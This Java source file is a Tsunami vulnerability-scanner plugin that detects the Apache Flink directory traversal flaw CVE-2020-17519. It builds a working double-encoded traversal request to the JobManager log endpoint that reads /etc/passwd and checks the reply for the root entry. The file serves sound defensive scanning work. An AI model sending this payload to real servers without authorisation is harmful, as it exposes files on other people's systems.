/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.directorytraversal.cve202017519;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.Gson;
import com.google.gson.JsonSyntaxException;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} plugin that detects CVE-2020-17519.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Apache Flink CVE-2020-17519 Detector",
    version = "0.1",
    description = "Plugin detects a directory traversal exploit in Apache Flink 1.11.0 to 1.11.2 "
        + "(CVE-2020-17519).",
    author = "Tsunami Team (tsunami-dev@google.com)",
    bootstrapModule = Cve202017519DetectorBootstrapModule.class)
public final class Cve202017519Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String FLINK_LOG_QUERY_STRING = "jobmanager/logs/";
  private static final String QUERY_STRING = FLINK_LOG_QUERY_STRING + "..%252f..%252f..%252f.."
      + "%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f.."
      + "%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f.."
      + "%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f.."
      + "%252fetc%252fpasswd";

  static final String DETECTION_STRING = "root:x:0:0:root";

  private static final class LogResponse {
    public LogObject[] logs;

    LogResponse() {
    }

    private static class LogObject {
      public String name;
      public int size;
    }
  }

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  Cve202017519Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve202017519Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isFlinkService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
        + QUERY_STRING;

    try {
      HttpResponse httpResponse =
          httpClient.send(
              get(targetUri)
                  .withEmptyHeaders()
                  .build(),
              networkService);

      if (httpResponse.status().code() != 200) {
        return false;
      }

      return httpResponse.bodyString().orElseGet(() -> "").contains(DETECTION_STRING);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      // Avoid false positives.
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("GOOGLE")
                        .setValue("CVE_2020_17519"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Apache Flink Unauthorized Directory Traversal (CVE-2020-17519)")
                .setDescription(
                    "A change introduced in Apache Flink 1.11.0 (and released in 1.11.1 and "
                        + "1.11.2 as well) allows attackers to read any file on the local "
                        + "filesystem of the JobManager through the REST interface of the "
                        + "JobManager process. Access is restricted to files accessible by the "
                        + "JobManager process. All users should upgrade to Flink 1.11.3 or "
                        + "1.12.0 if their Flink instance(s) are exposed. The issue was fixed in "
                        + "commit b561010b0ee741543c3953306037f00d7a9f0801 from "
                        + "apache/flink:master."))
        .build();
  }

  private boolean isFlinkService(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
         + "jobmanager/logs/";

    try {
      HttpResponse httpResponse =
          httpClient.send(
              get(targetUri)
                  .withEmptyHeaders()
                  .build(),
              networkService);

      if (httpResponse.status().code() != 200) {
        return false;
      }

      Gson gson = new Gson();
      LogResponse logResponse = gson.fromJson(
          httpResponse.bodyString().orElseGet(() -> ""),
          LogResponse.class);

      // Check to make sure the logs field in the JSON is set. Deserializes to null if not found.
      return (logResponse.logs != null);
    } catch (JsonSyntaxException e) {
      logger.atInfo().withCause(e).log(
          "Endpoint %s does not return the expected JSON. Possibly not Flink Service.",
          networkService);
      // Avoid false positives.
      return false;
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      // Avoid false positives.
      return false;
    }
  }
}
